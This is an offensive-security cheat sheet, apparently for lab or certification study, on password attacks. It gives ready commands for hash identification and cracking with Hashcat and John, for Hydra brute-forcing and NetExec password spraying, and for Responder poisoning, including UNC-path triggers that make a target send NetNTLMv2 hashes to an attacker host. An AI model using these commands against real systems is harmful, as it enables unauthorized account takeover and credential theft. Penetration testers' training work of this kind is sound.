# Password Attacks Methodology

> *Operational Workflow: Hash Identification (Phase 1) -> Offline Hash Cracking via Hashcat & John (Phase 2) -> Online Service Brute-Forcing & Password Spraying (Phase 3) -> Salt Handling & Algorithm Pitfalls (Phase 4) -> Operational Checklist (Phase 5)*
> *Essential Cheatsheets: [[⛏️ hashcat-john|Hashcat & John]], [[🐧 linux-commands|Linux Commands]], [[🪟 windows-commands|Windows Commands]], [[🔧 impacket|Impacket]], [[🔀 ligolo-chisel|Ligolo & Chisel]], [[🟠 BurpSuite|Burp Suite]]*

---

# Phase 0: Operational Password Attack Workflow

> *Follow this standardized operational sequence immediately upon discovering a cryptographic hash, protected archive, or network authentication endpoint.*

```text
1. EXFILTRATE & EXTRACT HASH TO KALI
   └── Collect raw strings from /etc/shadow, SAM/SYSTEM hives, web configurations, or database dumps.
   └── Save clean, untruncated hash strings into dedicated text files (e.g., hash.txt).

2. RAPID HASH IDENTIFICATION (Under 10 Seconds)
   └── Inspect format, string length, and unique prefixes ($1$, $2y$, $6$, $krb5$).
   └── Verify candidate algorithms using `nth` (Name-That-Hash) or `hashid`.

3. PRE-COMPUTED OSINT LOOKUP (Zero Compute Cost)
   └── Query public rainbow tables: CrackStation.net.
   └── Query search engines: Paste the exact hash string directly into Google.
   └── If cleartext is found: Proceed immediately to exploitation.

4. OFFLINE GPU CRACKING (Hashcat)
   └── Transfer hash to host machine or GPU instance for hardware acceleration.
   └── Launch Hashcat using the verified mode (-m) and rockyou.txt wordlist.

5. TIMEBOX POLICY (10-Minute Rule)
   └── If rockyou.txt does not crack the hash within 10 minutes, evaluate rule-based mutations.
   └── Apply best64.rule for an additional 5 minutes.
   └── If cracking fails: Pivot to alternative enumeration vectors to avoid rabbit holes.
```

---

# Password Attack Vector Triage Matrix

> *Operational Triage: Select the appropriate cracking tool, online brute-force utility, or conversion module based on discovered authentication artifacts.*

| Discovered Artifact / Operational Objective | Recommended Cracking Vector | Methodology Section |
| :--- | :--- | :--- |
| Unidentified cryptographic hash string | Hash Identification and Type Recognition | [[#Phase 1: Hash Identification and Type Recognition]] |
| Extracted password hashes (/etc/shadow, SAM, NTLM, MD5) | Hashcat GPU Cracking Modes | [[#2.1: Hashcat GPU Cracking Modes]] |
| Standard wordlist fails / Password policy enforced | Hashcat Rule-Based Mutations | [[#2.2: Hashcat Rule-Based Wordlist Mutations]] |
| Encrypted archives, SSH keys, KeePass databases | John the Ripper 2john Conversion Suite | [[#2.3: John the Ripper and the 2john Conversion Suite]] |
| Network login services (SSH, FTP, RDP, SMB) | Hydra Online Network Brute-Forcing | [[#3.1: Hydra Online Network Brute-Forcing]] |
| Web login forms (HTTP POST / Basic Auth) | HTTP POST Web Login Brute-Forcing | [[#3.2: HTTP POST Web Login Brute-Forcing]] |
| Target-specific vocabulary / Custom wordlists | Targeted Wordlist Generation with CeWL | [[#3.3: Targeted Wordlist Generation with CeWL]] |
| Valid password candidate / Multiple target accounts | Multi-Service Password Spraying | [[#3.4: Multi-Service Password Spraying]] |
| Windows network traffic / LLMNR broadcast injection | Responder NetNTLMv2 Capture and Cracking | [[#3.5: Responder NetNTLMv2 Capture and Cracking]] |
| Hashes with independent salts or slow algorithms (bcrypt) | Salt Handling, Slow Hashes, and False Friends | [[#Phase 4: Salt Handling, Slow Hashes, and False Friends]] |

---

# Phase 1: Hash Identification and Type Recognition

### Visual Hash Recognition Reference

| Visual Structure / Characteristics | Candidate Hash Types | Target Environment | Hashcat Mode |
| :--- | :--- | :--- | :--- |
| **32 hex characters** | **NTLM** or **MD5** | Windows (NTLM) / Linux & Web (MD5) | `-m 1000` (NTLM) / `-m 0` (MD5) |
| **40 hex characters** | **SHA-1** | Git repositories, legacy databases | `-m 100` |
| **64 hex characters** | **SHA-256** | Modern web frameworks, certificates | `-m 1400` |
| **128 hex characters** | **SHA-512** | High-security hashing, API signatures | `-m 1700` |
| Starts with `$1$` | **MD5crypt** | Legacy Linux `/etc/shadow` | `-m 500` |
| Starts with `$2a$`, `$2b$`, `$2y$` | **bcrypt** (Slow algorithm) | Modern web applications, CMS databases | `-m 3200` |
| Starts with `$5$` | **SHA-256crypt** | Linux `/etc/shadow` | `-m 7400` |
| Starts with `$6$` | **SHA-512crypt** | Standard modern Linux `/etc/shadow` | `-m 1800` |
| Format `user::domain:...` | **NetNTLMv2** | Windows network capture (Responder) | `-m 5600` |
| Starts with `$krb5asrep$` | **Kerberos AS-REP** | Active Directory `DONT_REQ_PREAUTH` | `-m 18200` |
| Starts with `$krb5tgs$` | **Kerberos TGS** | Active Directory Kerberoasting | `-m 13100` (RC4) / `-m 19700` (AES) |
| Format `user:SID:LM:NTLM:::` | **SAM Database Dump** | Windows local SAM hive extraction | `-m 1000` (Extract 4th field) |

> 💡 **Disambiguating MD5 vs NTLM (32 Hex Characters):**
> Both MD5 and NTLM produce identical 32-character hexadecimal strings. Distinguish them by operational context:
> - If extracted from Windows memory, SAM, SYSTEM, or `secretsdump`: **NTLM (`-m 1000`)**.
> - If extracted from Linux web databases, CMS configurations, or SQL tables: **MD5 (`-m 0`)**.

### Automated Hash Identification Tools

```bash
# Name-That-Hash (Modern, high accuracy)
nth --text '5f4dcc3b5aa765d61d8327deb882cf99'

# Hashid (Alternative CLI identification tool)
hashid -m -j '5f4dcc3b5aa765d61d8327deb882cf99'
```

---

# Phase 2: Offline Hash Cracking (Hashcat and John the Ripper)

## 2.1: Hashcat GPU Cracking Modes

> *Execute Hashcat on your host operating system whenever possible to leverage dedicated physical GPU compute acceleration.*

```bash
# Standard Dictionary Attack Syntax:
hashcat -m [MODE] -a 0 hash.txt /path/to/rockyou.txt

# Optimized Kernel Execution (Significantly accelerates cracking speeds):
hashcat -m [MODE] -a 0 -O hash.txt /path/to/rockyou.txt
```

### The Most Common Hashcat Modes in Offensive Labs

| Target Environment / Hash Format | Hashcat Mode | Full Command Syntax |
| :--- | :--- | :--- |
| **Linux `/etc/shadow` (`$6$` SHA-512crypt)** | `-m 1800` | `hashcat -m 1800 -a 0 hash.txt rockyou.txt` |
| **Linux `/etc/shadow` (`$1$` MD5crypt)** | `-m 500` | `hashcat -m 500 -a 0 hash.txt rockyou.txt` |
| **Windows Local SAM & NTDS.dit (NTLM)** | `-m 1000` | `hashcat -m 1000 -a 0 -O hash.txt rockyou.txt` |
| **Windows NetNTLMv2 (Responder Capture)** | `-m 5600` | `hashcat -m 5600 -a 0 hash.txt rockyou.txt` |
| **Kerberos AS-REP Roasting** | `-m 18200` | `hashcat -m 18200 -a 0 hash.txt rockyou.txt` |
| **Kerberos TGS Roasting (RC4-HMAC)** | `-m 13100` | `hashcat -m 13100 -a 0 hash.txt rockyou.txt` |
| **Web Database MD5** | `-m 0` | `hashcat -m 0 -a 0 -O hash.txt rockyou.txt` |
| **Web Database SHA-1** | `-m 100` | `hashcat -m 100 -a 0 -O hash.txt rockyou.txt` |
| **Web Database SHA-256** | `-m 1400` | `hashcat -m 1400 -a 0 -O hash.txt rockyou.txt` |
| **Web Database bcrypt (`$2a$`, `$2y$`)** | `-m 3200` | `hashcat -m 3200 -a 0 hash.txt rockyou.txt` |

---

## 2.2: Hashcat Rule-Based Wordlist Mutations

> *Rule-based mutations dynamically transform base dictionary words to match complex enterprise password policies (capitalization, appended digits, special symbols).*

### Core Rule Functions Reference

| Function Symbol | Operational Transformation | Example Output (`password`) |
| :--- | :--- | :--- |
| `c` | Capitalize first character, lowercase remainder | `Password` |
| `u` | Convert all characters to UPPERCASE | `PASSWORD` |
| `l` | Convert all characters to lowercase | `password` |
| `$X` | Append character X to the end | `$1` -> `password1` |
| `^X` | Prepend character X to the beginning | `^!` -> `!password` |
| `r` | Reverse all characters in word | `drowssap` |
| `d` | Duplicate entire word | `passwordpassword` |

### Applying Rules in Practice
```bash
# Preview custom rule transformations via stdout
echo '$1 c $!' > custom.rule
hashcat -r custom.rule --stdout wordlist.txt | head -n 5
# Outputs: Password1!, Admin1!, Root1!

# Execute dictionary attack using pre-packaged high-performance rules
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

---

## 2.3: John the Ripper and the 2john Conversion Suite

> *John the Ripper excels at CPU-based multi-threading and includes specialized extraction scripts (`*2john`) to convert encrypted containers, archives, and keys into crackable hashes.*

### Standard Cracking Commands
```bash
# Execute wordlist attack via John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Display cracked passwords from John's internal database (john.pot)
john --show hash.txt
```

### The `*2john` Extraction Suite

| Target File Format | Extraction Utility Syntax | Cracking Command |
| :--- | :--- | :--- |
| **Encrypted SSH Private Key (`id_rsa`)** | `ssh2john id_rsa > id_rsa.hash` | `john --wordlist=rockyou.txt id_rsa.hash` |
| **Encrypted ZIP Archive** | `zip2john archive.zip > zip.hash` | `john --wordlist=rockyou.txt zip.hash` |
| **Encrypted RAR Archive** | `rar2john archive.rar > rar.hash` | `john --wordlist=rockyou.txt rar.hash` |
| **Encrypted 7-Zip Archive** | `7z2john.pl archive.7z > 7z.hash` | `john --wordlist=rockyou.txt 7z.hash` |
| **Protected PDF Document** | `pdf2john doc.pdf > pdf.hash` | `john --wordlist=rockyou.txt pdf.hash` |
| **Protected MS Office Document (`.docx`, `.xlsx`)** | `office2john document.docx > office.hash` | `john --wordlist=rockyou.txt office.hash` |
| **KeePass Database (`.kdbx`)** | `keepass2john database.kdbx > keepass.hash` | `john --wordlist=rockyou.txt keepass.hash` |
| **Linux `/etc/passwd` + `/etc/shadow`** | `unshadow /etc/passwd /etc/shadow > unshadowed.hash` | `john --wordlist=rockyou.txt unshadowed.hash` |
| **GPG / PGP Private Key Ring** | `gpg2john secret.key > gpg.hash` | `john --wordlist=rockyou.txt gpg.hash` |

---

# Phase 3: Online Service Authentication Attacks and Password Spraying

## 3.1: Hydra Online Network Brute-Forcing

> *Online brute-forcing targets active network daemons (SSH, FTP, RDP, SMB). Manage thread counts (`-t`) carefully to prevent service crashes or network connection throttling.*

```bash
# 1. SSH Service Brute-Force (Single User)
hydra -l [USERNAME] -P /usr/share/wordlists/rockyou.txt [TARGET_IP] ssh -t 4

# 2. SSH Service Brute-Force (User List + Password List)
# Flag -e nsr: Tests Null password (n), Same-as-login (s), and Reversed login (r)
hydra -L users.txt -P passwords.txt -e nsr [TARGET_IP] ssh -t 4

# 3. FTP Service Brute-Force
hydra -l [USERNAME] -P /usr/share/wordlists/rockyou.txt [TARGET_IP] ftp -vV

# 4. Windows RDP Authentication
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://[TARGET_IP] -t 4

# 5. Windows SMB Authentication
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://[TARGET_IP]

# 6. MySQL Database Daemon
hydra -l root -P /usr/share/wordlists/rockyou.txt [TARGET_IP] mysql
```

---

## 3.2: HTTP POST Web Login Brute-Forcing

> *Intercept the authentication request in Burp Suite to identify the target path, parameter keys, and failure indicator string.*

```bash
# Syntax:
# hydra -l [USER] -P [WORDLIST] [TARGET_IP] http-post-form "[PATH]:[POST_BODY]:[FAIL_CONDITION]"

# Example: Standard Web Application Login
hydra -l admin -P /usr/share/wordlists/rockyou.txt [TARGET_IP] http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Submit:Invalid credentials" -V
```

### Parameter Breakdown:
- `/login.php`: Relative URI path hosting the form endpoint.
- `username=^USER^&password=^PASS^&Login=Submit`: Exact POST body payload. Hydra substitutes `^USER^` and `^PASS^`.
- `Invalid credentials`: String present in server response when authentication FAILS.

---

## 3.3: Targeted Wordlist Generation with CeWL

> *When standard wordlists fail, scrape unique organizational vocabulary, usernames, and domain keywords directly from target web applications.*

```bash
# Scrape words with a minimum length of 6 characters up to depth 2
cewl -d 2 -m 6 -w custom_wordlist.txt http://[TARGET_IP]/

# Scrape target web portal and include email addresses discovered in meta tags
cewl -d 2 -m 6 -e --email_file emails.txt -w target_wordlist.txt http://[TARGET_IP]/

# Pair CeWL wordlist with targeted Hydra attack
hydra -L users.txt -P target_wordlist.txt [TARGET_IP] ssh -t 4
```

---

## 3.4: Multi-Service Password Spraying

> *Password spraying tests a single candidate password across multiple user accounts to bypass individual account lockout thresholds.*

```bash
# 1. Active Directory & SMB Spraying via NetExec
nxc smb [TARGET_IP] -u users.txt -p 'Spring2026!' --continue-on-success

# 2. Windows Remote Management (WinRM) Spraying via NetExec
nxc winrm [TARGET_IP] -u users.txt -p 'Spring2026!' --continue-on-success

# 3. SSH Service Password Spraying via Hydra
hydra -L users.txt -p 'TargetCompany2026!' [TARGET_IP] ssh -t 4

# 4. RDP Service Password Spraying via Hydra
hydra -L users.txt -p 'TargetCompany2026!' rdp://[TARGET_IP] -t 4
```

---

## 3.5: Responder NetNTLMv2 Capture and Cracking

> *Poison local broadcast name resolution queries (LLMNR, NBT-NS) to capture incoming Windows authentication handshakes.*

```bash
# 1. Launch Responder on Kali's active interface
sudo responder -I tun0 -dwv

# 2. Trigger connection from target Windows host via UNC path:
# In CMD: dir \\[KALI_IP]\share
# In MSSQL: EXEC master..xp_dirtree '\\[KALI_IP]\share', 1, 1;

# 3. Crack captured NetNTLMv2 hash using Hashcat mode 5600
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

# Phase 4: Salt Handling, Slow Hashes, and False Friends

## 4.1: Handling Cryptographic Salts

### Integrated Salts (Automatic Handling)
Standard Unix shadow hashes (`$6$salt$hash...`) and Apache MD5 hashes encapsulate the salt directly within the string. Hashcat and John automatically parse and apply integrated salts without manual formatting.

### Separated Salts (Manual Hash Formatting)
When an application database or exploit returns the hash and salt in separate fields:

```text
Extracted Hash: 0c01f4468bd75d7a84c7eb73846e8d96
Extracted Salt: 1dac0d92e9fa6bb2
```

Consult the **Hashcat Example Hashes Wiki** to verify whether the algorithm expects `hash:salt` or `salt:hash`:
```bash
# MD5 with Salt: md5($pass.$salt) -> Mode 10
echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt
hashcat -m 10 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# MD5 with Salt: md5($salt.$pass) -> Mode 20
echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt
hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

> ⚠️ **Critical Salt Pitfall:**
> Cracking a salted hash as a plain unsalted hash (`-m 0`) produces completely invalid cleartext passwords. Always verify whether a salt column exists in database dumps.

---

## 4.2: Computational Speed and Slow Hash Management

| Hash Algorithm | Computational Speed (GPU) | Estimated Rockyou Duration | Recommended Operational Action |
| :--- | :--- | :--- | :--- |
| **NTLM (`-m 1000`)** | > 100 Billion hashes / sec | Under 10 seconds | **Crack immediately.** Highly viable. |
| **MD5 (`-m 0`)** | > 40 Billion hashes / sec | Under 30 seconds | **Crack immediately.** Highly viable. |
| **SHA-512crypt (`-m 1800`)** | ~ 500,000 hashes / sec | 5 to 15 minutes | Acceptable for targeted wordlists. |
| **bcrypt (`-m 3200`)** | ~ 5,000 - 25,000 hashes / sec | **2 to 8+ Hours** | **Timebox strictly to 5 minutes.** If uncracked, pivot to other attack vectors. |

---

## 4.3: Common Ambiguities and False Friends

- **MD5 vs NTLM**: Both consist of 32 hex characters. Linux and web environments use MD5 (`-m 0`); Windows SAM, LSASS, and Active Directory use NTLM (`-m 1000`).
- **SHA-1 vs HMAC-SHA1**: Both contain 40 hex characters. If an additional secret key is associated with the hash, select HMAC-SHA1 (`-m 150`) rather than standard SHA-1 (`-m 100`).
- **NTLMv1 vs NetNTLMv2**: NTLMv1 (`-m 5500`) contains 48 hex characters in the response field; modern Windows networks default to NetNTLMv2 (`-m 5600`), distinguished by variable length and the `user::domain` structure.

---

# Phase 5: Quick Reference Password Attack Checklist

```text
=== PHASE 1: DISCOVERY AND IDENTIFICATION ===
[ ] Identify hash length and prefix          -> nth --text 'HASH'  OR  hashid 'HASH'
[ ] Query public pre-computed databases      -> CrackStation.net  OR  Google search
[ ] Match correct Hashcat mode               -> Refer to Hashcat Example Hashes wiki

=== PHASE 2: OFFLINE CRACKING ===
[ ] Standard dictionary attack               -> hashcat -m [MODE] -a 0 -O hash.txt rockyou.txt
[ ] Rule-based dictionary mutation           -> hashcat -m [MODE] -a 0 hash.txt rockyou.txt -r best64.rule
[ ] Encrypted archive / container conversion -> ssh2john, zip2john, keepass2john, unshadow
[ ] CPU cracking fallback with John          -> john --wordlist=rockyou.txt hash.txt
[ ] Timebox slow hashes (bcrypt)             -> Limit to 5 minutes before exploring alternative paths

=== PHASE 3: ONLINE BRUTE-FORCING ===
[ ] Check account lockout policy first       -> Prevent account lockout before spraying
[ ] Network service brute-forcing (SSH/RDP)  -> hydra -l [USER] -P rockyou.txt [TARGET_IP] [SERVICE]
[ ] Web login form brute-forcing             -> hydra -l admin -P rockyou.txt [IP] http-post-form "..."
[ ] Multi-user password spraying             -> nxc smb/winrm [IP] -u users.txt -p 'Password123!'
[ ] Generate custom targeted wordlist        -> cewl -d 2 -m 6 -w custom.txt http://[TARGET_IP]/
```
